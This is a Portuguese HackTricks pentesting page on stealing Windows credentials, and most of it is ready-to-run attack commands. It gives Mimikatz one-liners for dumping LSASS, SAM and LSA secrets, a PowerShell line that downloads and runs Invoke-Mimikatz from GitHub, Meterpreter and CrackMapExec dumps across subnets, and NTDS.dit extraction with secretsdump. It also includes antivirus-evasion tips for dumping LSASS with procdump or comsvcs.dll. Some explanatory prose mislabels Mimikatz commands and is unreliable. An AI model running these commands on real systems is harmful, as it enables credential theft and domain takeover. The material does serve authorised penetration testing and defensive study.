# Roubo de Credenciais do Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novos programas de recompensas por bugs

💬 Participe de discussões na comunidade

## Mimikatz de Credenciais
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
### Invoke-Mimikatz

### Invoke-Mimikatz

O Mimikatz é uma ferramenta poderosa que pode ser usada para roubar credenciais de usuários em um sistema Windows. O Invoke-Mimikatz é um módulo do PowerShell que permite que os usuários executem o Mimikatz diretamente da linha de comando. Isso significa que os usuários podem usar o Mimikatz sem precisar baixar e instalar o software em seus sistemas.

O Invoke-Mimikatz pode ser usado para executar uma variedade de ataques, incluindo a extração de senhas em texto claro, hashes de senha e chaves de criptografia. Ele também pode ser usado para realizar ataques pass-the-hash e pass-the-ticket, que permitem que os usuários assumam o controle de uma conta de usuário sem precisar saber a senha real.

Além disso, o Invoke-Mimikatz pode ser usado para explorar vulnerabilidades em sistemas Windows e para obter informações confidenciais, como chaves de criptografia e senhas armazenadas em cache. No entanto, é importante lembrar que o uso do Mimikatz e do Invoke-Mimikatz pode ser ilegal sem a permissão explícita do proprietário do sistema.
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprenda sobre algumas possíveis proteções de credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Plugin de Credenciais**](https://github.com/carlospolop/MSF-Credentials) **que eu criei para procurar por senhas e hashes** dentro da vítima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassando AV

### Procdump + Mimikatz

Como o **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, ele não é detectado pelo Defender.\
Você pode usar essa ferramenta para **fazer dump do processo lsass**, **baixar o dump** e **extrair as credenciais localmente** do dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Extrair credenciais do dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Este processo é feito automaticamente com o [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso do **procdump.exe para despejar o lsass.exe**, isso ocorre porque eles estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **furtivo** passar como **argumento** o **PID** do lsass.exe para o procdump **em vez do** nome lsass.exe.

### Despejando o lsass com **comsvcs.dll**

Existe uma DLL chamada **comsvcs.dll**, localizada em `C:\Windows\System32`, que **despeja a memória do processo** sempre que eles **falham**. Essa DLL contém uma **função** chamada **`MiniDumpW`** que é escrita para que possa ser chamada com `rundll32.exe`.\
Os dois primeiros argumentos não são usados, mas o terceiro é dividido em 3 partes. A primeira parte é o ID do processo que será despejado, a segunda parte é a localização do arquivo de despejo e a terceira parte é a palavra **full**. Não há outra escolha.\
Assim que esses 3 argumentos forem analisados, basicamente essa DLL cria o arquivo de despejo e despeja o processo especificado nesse arquivo de despejo.\
Graças a essa função, podemos usar a **comsvcs.dll** para despejar o processo lsass em vez de fazer o upload do procdump e executá-lo. (Essa informação foi extraída de [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
Apenas temos que ter em mente que essa técnica só pode ser executada como **SYSTEM**.

**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Despejando o lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito do mouse na barra de tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure pelo processo "Processo de Autoridade de Segurança Local" na guia Processos
4. Clique com o botão direito do mouse no processo "Processo de Autoridade de Segurança Local" e clique em "Criar arquivo de despejo".

### Despejando o lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte do conjunto de ferramentas [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## CrackMapExec

### Extrair hashes do SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Despejar segredos LSA

LSA (Local Security Authority) é um serviço do Windows que é responsável por gerenciar a segurança local, incluindo autenticação e controle de acesso. Os segredos LSA são informações confidenciais armazenadas pelo serviço LSA, como senhas e chaves de criptografia.

Para despejar os segredos LSA, podemos usar a ferramenta `lsadump`, que faz parte do conjunto de ferramentas do Mimikatz. O `lsadump` pode ser usado para despejar os segredos LSA do sistema local ou de um sistema remoto.

Para despejar os segredos LSA do sistema local, execute o seguinte comando:

```
mimikatz # lsadump::lsa /inject /name:LSA
```

Para despejar os segredos LSA de um sistema remoto, execute o seguinte comando:

```
mimikatz # lsadump::dcsync /user:<username> /domain:<domain> /dc:<domain_controller>
```

Substitua `<username>` pelo nome de usuário do domínio que você deseja comprometer, `<domain>` pelo nome do domínio e `<domain_controller>` pelo nome do controlador de domínio.

Os segredos LSA podem conter senhas de usuário e informações de autenticação de serviços, portanto, é importante proteger essas informações para evitar vazamentos de dados.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Despejar o NTDS.dit do DC de destino
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Despeje o histórico de senhas do NTDS.dit do DC de destino
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar o atributo pwdLastSet para cada conta NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais sobre bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

## Roubo de SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de maneira regular** porque eles estão protegidos.

### Do Registro

A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Cópia de sombra de volume

Você pode realizar a cópia de arquivos protegidos usando este serviço. Você precisa ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mas você pode fazer o mesmo a partir do **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (o disco rígido usado é "C:" e é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Por fim, você também pode usar o [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia do SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenciais do Active Directory - NTDS.dit**

O arquivo Ntds.dit é um banco de dados que armazena dados do Active Directory, incluindo informações sobre objetos de usuário, grupos e associação a grupos. Ele inclui os hashes de senha de todos os usuários do domínio.

O importante arquivo NTDS.dit estará localizado em: _%SystemRoom%/NTDS/ntds.dit_\
Este arquivo é um banco de dados _Extensible Storage Engine_ (ESE) e é "oficialmente" composto por 3 tabelas:

* **Tabela de Dados**: Contém informações sobre os objetos (usuários, grupos...)
* **Tabela de Links**: Informações sobre as relações (membro de...)
* **Tabela SD**: Contém os descritores de segurança de cada objeto

Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

O Windows usa o _Ntdsa.dll_ para interagir com esse arquivo e é usado pelo _lsass.exe_. Então, **parte** do arquivo **NTDS.dit** pode estar localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente por causa da melhoria de desempenho usando um **cache**).

#### Descriptografando os hashes dentro do NTDS.dit

O hash é cifrado 3 vezes:

1. Descriptografe a Chave de Criptografia de Senha (**PEK**) usando o **BOOTKEY** e o **RC4**.
2. Descriptografe o **hash** usando **PEK** e **RC4**.
3. Descriptografe o **hash** usando **DES**.

**PEK** tem o **mesmo valor** em **todos os controladores de domínio**, mas é **cifrado** dentro do arquivo **NTDS.dit** usando o **BOOTKEY** do **arquivo SYSTEM do controlador de domínio (é diferente entre controladores de domínio)**. É por isso que para obter as credenciais do arquivo NTDS.dit **você precisa dos arquivos NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Você também pode usar o truque do [**volume shadow copy**](./#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que você também precisará de uma cópia do arquivo **SYSTEM** (novamente, [**despeje-o do registro ou use o truque do volume shadow copy**](./#stealing-sam-and-system)).

### **Extraindo hashes do NTDS.dit**

Depois de **obter** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como o _secretsdump.py_ para **extrair os hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Você também pode **extrair as credenciais automaticamente** usando um usuário de administrador de domínio válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para arquivos NTDS.dit grandes, é recomendado extrair usando o [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Além disso, você também pode usar o módulo do **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ ou o **mimikatz** `lsadump::lsa /inject`.

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos NTDS podem ser extraídos para um banco de dados SQLite com o [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não apenas segredos são extraídos, mas também todos os objetos e seus atributos para uma maior extração de informações quando o arquivo NTDS.dit bruto já foi recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
O arquivo `SYSTEM` é opcional, mas permite a decodificação de segredos (hashes NT e LM, credenciais suplementares como senhas em texto claro, chaves kerberos ou de confiança, históricos de senhas NT e LM). Juntamente com outras informações, os seguintes dados são extraídos: contas de usuário e máquina com seus hashes, flags UAC, timestamp do último logon e alteração de senha, descrição de contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associações, domínios confiáveis com tipo, direção e atributos de confiança...

## Lazagne

Baixe o binário da [qui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar este binário para extrair credenciais de vários softwares.
```
lazagne.exe all
```
## Outras ferramentas para extrair credenciais do SAM e LSASS

### Windows Credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrai credenciais do arquivo SAM.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrai credenciais do arquivo SAM.
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Baixe-o em: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e apenas **execute-o** e as senhas serão extraídas.

## Defesas

[**Aprenda sobre algumas proteções de credenciais aqui.**](credentials-protections.md)

​

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Siga HackenProof**](https://bit.ly/3xrrDrL) **para aprender mais sobre bugs web3**

🐞 Leia tutoriais de bugs web3

🔔 Receba notificações sobre novas recompensas por bugs

💬 Participe de discussões na comunidade

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
